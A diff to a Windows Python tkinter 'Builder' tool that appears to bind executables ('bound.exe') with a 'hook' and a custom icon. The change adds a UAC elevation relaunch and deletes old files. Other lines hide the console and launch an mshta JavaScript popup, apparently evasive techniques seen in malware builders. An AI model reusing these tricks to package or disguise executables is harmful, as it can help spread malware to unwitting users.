@@ -2,7 +2,7 @@ import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
 from socket import create_connection
-import json, os, subprocess, shutil, webbrowser, ctypes
+import json, os, subprocess, shutil, webbrowser, ctypes, sys
 
 def ToggleConsole(choice):
 	if choice:
@@ -11,6 +11,12 @@ def ToggleConsole(choice):
 	else:
 		# Hide Console
 		ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() == 1
+    except Exception:
+        return False
 
 class Builder:
 	def __init__(self):
@@ -142,9 +148,9 @@ class Builder:
 			file.write(hook)
 		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
 		if os.path.isfile("icon.ico"):
-			os.rename("icon.ico", "icon.ico.old")
+			os.remove("icon.ico")
 		if os.path.isfile("bound.exe"):
-			os.rename("bound.exe", "bound.exe.old")
+			os.remove("bound.exe")
 		if len(self.iconFileData):
 			with open("icon.ico", "wb") as file:
 				file.write(self.iconFileData)
@@ -332,6 +338,9 @@ if __name__ == "__main__":
 			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			os._exit(1)
 		ToggleConsole(False)
+		if not is_admin():
+			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+			exit()
 		Builder()
 	else:
 		print("Only Windows OS is supported!")
